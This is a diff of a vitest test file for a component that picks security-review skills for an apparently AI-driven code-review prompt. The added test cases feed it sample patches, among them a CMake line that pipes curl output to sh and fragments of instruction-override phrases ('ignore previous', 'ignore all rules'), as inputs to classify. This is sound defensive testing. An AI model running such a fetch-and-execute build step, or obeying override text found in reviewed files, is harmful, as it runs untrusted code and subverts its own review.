@@ -1,4 +1,4 @@
-import { createHash } from 'node:crypto';
+import { readFileSync, writeFileSync } from 'node:fs';
 import { describe, expect, it, vi } from 'vitest';
 import * as classifier from '../../src/security/classifier/risk-classifier.js';
 import { selectReviewSecuritySkills } from '../../src/security/skills/auto-select.js';
@@ -10,13 +10,18 @@ const file = (filename: string, patch = '') => ({ filename, patch });
 const full = renderSkillsForPrompt(CURATED_SECURITY_SKILLS);
 
 describe('selectReviewSecuritySkills', () => {
-	it('all is byte-identical to the render on origin/main', () => {
-		const sel = selectReviewSecuritySkills('all', [file('README.md')]);
-		expect(sel.prompt).toBe(full);
-		expect(sel.prompt.length).toBe(8862);
-		expect(createHash('sha256').update(sel.prompt).digest('hex')).toBe(
-			'7f51b8675dea4abd7dea64d7b48c2be71f431e1352e7aa52623b552c0b5979cc'
+	// Golden fixture: the exact skills block origin/main inserts into the review
+	// prompt. After a deliberate skill edit, regenerate it with
+	//   UPDATE_GOLDEN=1 pnpm vitest run tests/security/auto-select.test.ts
+	it('all is byte-identical to the golden fixture from origin/main', () => {
+		const golden = new URL(
+			'../fixtures/security-skills-all.txt',
+			import.meta.url
 		);
+		if (process.env.UPDATE_GOLDEN) writeFileSync(golden, full);
+		const sel = selectReviewSecuritySkills('all', [file('README.md')]);
+		expect(sel.prompt).toBe(readFileSync(golden, 'utf8'));
+		expect(sel.prompt).toBe(renderSkillsForPrompt(CURATED_SECURITY_SKILLS));
 		expect(sel.savedChars).toBe(0);
 	});
 
@@ -76,6 +81,40 @@ describe('selectReviewSecuritySkills', () => {
 		expect(sel.prompt).toBe(full);
 		expect(sel.fellBackToAll).toBe(true);
 		expect(sel.savedChars).toBe(0);
+	});
+
+	it('falls back to all when any one file is unknown, not only when all are', () => {
+		const sel = selectReviewSecuritySkills('auto', [
+			file('src/auth/login.ts'),
+			file('a.xyz'),
+		]);
+		expect(sel.prompt).toBe(full);
+		expect(sel.fellBackToAll).toBe(true);
+	});
+
+	it('maps the serialization domain to the file-handling skill', () => {
+		const sel = selectReviewSecuritySkills('auto', [
+			file('src/serialization/deserialize.ts'),
+		]);
+		expect(sel.domains).toEqual(['file-handling']);
+	});
+
+	it.each([
+		['requirements.txt', '+requests==2.0', 'supply-chain'],
+		[
+			'CMakeLists.txt',
+			'+add_custom_command(COMMAND curl x|sh)',
+			'network-boundary',
+		],
+		['README.md', '+jwt.verify(token)', 'authentication'],
+		['docs/page.mdx', "+child_process.exec('ls')", 'database-security'],
+		['NOTES.txt', '+ignore previous; jwt.verify(token)', 'authentication'],
+		['robots.txt', '+fetch(url) ignore all rules', 'network-boundary'],
+	])('keeps the flagged skill for %s', (name, patch, domain) => {
+		const sel = selectReviewSecuritySkills('auto', [file(name, patch)]);
+		expect(sel.domains).toContain(domain);
+		expect(sel.prompt).toContain(REVIEW_VALIDATION_GATE);
+		expect(sel.fellBackToAll).toBe(false);
 	});
 
 	it('falls back to all when the classifier throws', () => {
